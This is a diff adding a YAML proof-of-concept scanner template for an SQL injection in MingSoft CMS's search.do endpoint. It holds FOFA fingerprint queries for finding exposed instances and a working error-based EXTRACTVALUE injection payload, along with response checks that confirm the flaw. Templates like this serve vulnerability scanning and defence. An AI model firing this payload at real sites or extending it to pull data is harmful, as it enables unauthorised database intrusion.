@@ -1,0 +1,17 @@
+id: poc-yaml-mingsoft-cms-search-do-sqli
+info:
+  name: 铭飞CMS search.do SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 铭飞CMS
+  fofa: body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /mcms/search.do'%20AND%20EXTRACTVALUE(5225,CONCAT(0x5c,md5({{.t1}}),0x71767a707))%20AND%20'smmD'='smmD=1
+  expression: status_code == 500 && contains(body,"XPATH syntax error") && contains(body,substr(t2,0,31))
+    && contains(body,"java.sql.SQLException")
+transport: http
